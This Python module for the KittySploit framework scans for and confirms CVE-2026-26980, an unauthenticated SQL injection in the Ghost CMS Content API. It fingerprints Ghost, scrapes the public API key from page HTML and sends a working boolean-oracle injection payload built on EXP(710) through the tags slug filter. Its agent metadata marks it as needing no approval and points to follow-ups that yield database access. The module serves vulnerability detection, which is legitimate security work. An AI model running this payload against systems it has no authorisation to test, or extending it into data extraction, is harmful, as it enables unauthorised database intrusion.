#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import re
from typing import Optional, Tuple
from urllib.parse import quote

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "Ghost CMS CVE-2026-26980 detection",
        "description": (
            "Detects Ghost CMS and confirms CVE-2026-26980 (unauthenticated Content API "
            "slug filter SQL injection, 3.24.0–6.19.0). Scrapes the public Content API "
            "key from HTML, then verifies the EXP(710) boolean oracle on /ghost/api/content/tags/."
        ),
        "author": ["Nicholas Carlini", "KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-26980",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-26980",
            "https://github.com/TryGhost/Ghost/security/advisories/GHSA-w52v-v783-gw97",
            "https://www.sonicwall.com/blog/ghost-cms-content-api-blind-sql-injection",
        ],
        "modules": [
            "auxiliary/scanner/http/ghost_cve_2026_26980_sqli",
        ],
        "tags": [
            "web",
            "scanner",
            "ghost",
            "cms",
            "sqli",
            "unauthenticated",
            "cve-2026-26980",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 6,
            "reversible": True,
            "approval_required": False,
            "produces": ["tech_hints", "risk_signals", "endpoints"],
            "cost": 1.0,
            "noise": 0.4,
            "value": 1.0,
            "requires": {
                "min_endpoints": 0,
                "min_params": 0,
                "tech_hints_any": ["ghost"],
                "tech_hints_all": [],
                "specializations_any": [],
                "risk_signals_any": [],
                "auth_session": False,
                "capabilities_any": [],
                "capabilities_all": [],
                "confidence_min": {},
                "confidence_min_any": {},
                "endpoint_pattern_any": ["/ghost/api/content/"],
                "param_any": ["filter", "key"],
                "api_surface_ready": False,
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "db_access", "from_detail": "sqli"},
                ],
                "consumes_capabilities": [],
                "option_bindings": {},
                "suggested_followups": [
                    "auxiliary/scanner/http/ghost_cve_2026_26980_sqli",
                ],
            },
        },
    }

    port = OptPort(2368, "Ghost HTTP port (default 2368)", True)
    ssl = OptBool(False, "Use HTTPS", True, advanced=True)
    content_key = OptString(
        "",
        "Content API key (empty = scrape from HTML data-key)",
        required=False,
    )
    active_probe = OptBool(
        True,
        "Confirm SQLi with boolean oracle (1=1 / 1=0 via EXP(710))",
        required=False,
    )
    base_path = OptString("/", "Ghost base path prefix", required=False)

    def _timeout(self) -> int:
        return max(int(self.timeout or 15), 10)

    def _base(self) -> str:
        val = str(self.base_path or "/").strip() or "/"
        if not val.startswith("/"):
            val = "/" + val
        return val.rstrip("/") or ""

    def _path(self, suffix: str) -> str:
        base = self._base()
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base else suffix

    @staticmethod
    def _version_tuple(value: str) -> Optional[Tuple[int, ...]]:
        parts = []
        for part in str(value or "").split(".")[:3]:
            digits = "".join(ch for ch in part if ch.isdigit())
            if not digits:
                return None
            parts.append(int(digits))
        return tuple(parts) if parts else None

    def _is_affected(self, version: str) -> Optional[bool]:
        parsed = self._version_tuple(version)
        if not parsed:
            return None
        # 3.24.0 – 6.19.0 inclusive; fixed in 6.19.1
        if parsed < (3, 24, 0):
            return False
        if parsed >= (6, 19, 1):
            return False
        if parsed[0] > 6:
            return False
        return True

    def _looks_like_ghost(self) -> bool:
        for path in ("/", "/ghost/", "/ghost/api/admin/site/", "/rss/"):
            response = self.http_request(
                method="GET",
                path=self._path(path),
                timeout=self._timeout(),
                allow_redirects=True,
            )
            if not response:
                continue
            text = (response.text or "").lower()
            headers = {k.lower(): v for k, v in (response.headers or {}).items()}
            if "ghost" in text or "ghost" in headers.get("x-powered-by", "").lower():
                return True
            if 'generator" content="ghost' in text or "content=\"ghost" in text:
                return True
        return False

    def _get_version(self) -> str:
        for path in ("/", "/ghost/", "/ghost/api/admin/site/"):
            response = self.http_request(
                method="GET",
                path=self._path(path),
                timeout=self._timeout(),
                allow_redirects=True,
            )
            if not response:
                continue
            text = response.text or ""
            patterns = (
                r'content="Ghost\s+([\d.]+)"',
                r'"version"\s*:\s*"([\d.]+)"',
                r"Ghost\s+([\d]+\.[\d]+\.[\d]+)",
            )
            for pattern in patterns:
                match = re.search(pattern, text, re.I)
                if match:
                    return match.group(1)
        return ""

    def _scrape_content_key(self) -> str:
        configured = str(self.content_key or "").strip()
        if configured:
            return configured
        for path in ("/", "/ghost/"):
            response = self.http_request(
                method="GET",
                path=self._path(path),
                timeout=self._timeout(),
                allow_redirects=True,
            )
            if not response:
                continue
            text = response.text or ""
            match = re.search(r'data-key="([a-f0-9]{20,})"', text, re.I)
            if match:
                return match.group(1)
            match = re.search(
                r'["\']content[_-]?api[_-]?key["\']\s*[:=]\s*["\']([a-f0-9]{20,})["\']',
                text,
                re.I,
            )
            if match:
                return match.group(1)
        return ""

    def _content_get(self, resource: str, params: dict):
        query = "&".join(f"{k}={quote(str(v), safe='')}" for k, v in params.items())
        path = self._path(f"/ghost/api/content/{resource.lstrip('/')}")
        if query:
            path = f"{path}?{query}"
        return self.http_request(
            method="GET",
            path=path,
            headers={"Accept": "application/json"},
            timeout=self._timeout(),
            allow_redirects=False,
        )

    def _anchor_slug(self, key: str) -> str:
        response = self._content_get(
            "tags/",
            {"key": key, "filter": "slug:-null", "limit": "1"},
        )
        if response and response.status_code == 200:
            try:
                tags = (response.json() or {}).get("tags") or []
                if tags and tags[0].get("slug"):
                    return str(tags[0]["slug"])
            except Exception:
                pass
        return "news"

    def _oracle(self, key: str, slug: str, condition: str) -> Optional[bool]:
        payload = f"'||CASE WHEN {condition} THEN 0 ELSE EXP(710) END||'"
        filt = f"slug:[{payload},{slug}]"
        response = self._content_get("tags/", {"key": key, "filter": filt})
        if not response:
            return None
        if response.status_code == 200:
            return True
        if response.status_code == 500:
            return False
        return None

    def run(self):
        print_status(f"Probing Ghost CMS on port {self.port}...")

        if not self._looks_like_ghost():
            print_info("Ghost not detected")
            return False
        print_success("Ghost fingerprint matched")

        version = self._get_version()
        if version:
            affected = self._is_affected(version)
            tag = (
                "affected range"
                if affected is True
                else "likely patched"
                if affected is False
                else "unknown mapping"
            )
            print_status(f"Version: {version} [{tag}]")
        else:
            print_status("Version unknown")

        key = self._scrape_content_key()
        if not key:
            print_warning("Could not obtain Content API key from HTML")
            if version and self._is_affected(version):
                self.set_info(
                    severity="high",
                    cve="CVE-2026-26980",
                    reason=(
                        f"Ghost {version} in affected range; Content API key not found "
                        "(set content_key to confirm)"
                    ),
                    confidence="medium",
                    version=version,
                )
                return True
            return False

        print_success(f"Content API key: {key[:8]}…{key[-4:]}")

        if not self.active_probe:
            self.set_info(
                severity="high",
                cve="CVE-2026-26980",
                reason="Ghost + Content API key found; active_probe disabled",
                confidence="low",
                version=version,
            )
            return True

        slug = self._anchor_slug(key)
        print_status(f"Boolean oracle via slug filter (anchor={slug})")
        t_true = self._oracle(key, slug, "1=1")
        t_false = self._oracle(key, slug, "1=0")

        if t_true is True and t_false is False:
            reason = (
                f"CVE-2026-26980 confirmed: Content API slug filter boolean oracle "
                f"(version={version or 'unknown'})"
            )
            print_success(reason)
            self.set_info(
                severity="critical",
                cve="CVE-2026-26980",
                reason=reason,
                confidence="high",
                version=version,
                endpoint="/ghost/api/content/tags/",
            )
            return True

        if version and self._is_affected(version):
            print_warning("Oracle inconclusive; version still in affected range")
            self.set_info(
                severity="high",
                cve="CVE-2026-26980",
                reason=(
                    f"Ghost {version} potentially vulnerable but EXP(710) oracle "
                    "did not confirm (non-MySQL backend or patched mid-range)"
                ),
                confidence="medium",
                version=version,
            )
            return True

        print_info("Not confirmed vulnerable (oracle failed / likely patched)")
        self.set_info(
            severity="info",
            cve="CVE-2026-26980",
            reason="Ghost detected; SQLi oracle not confirmed",
            confidence="low",
            version=version,
        )
        return False
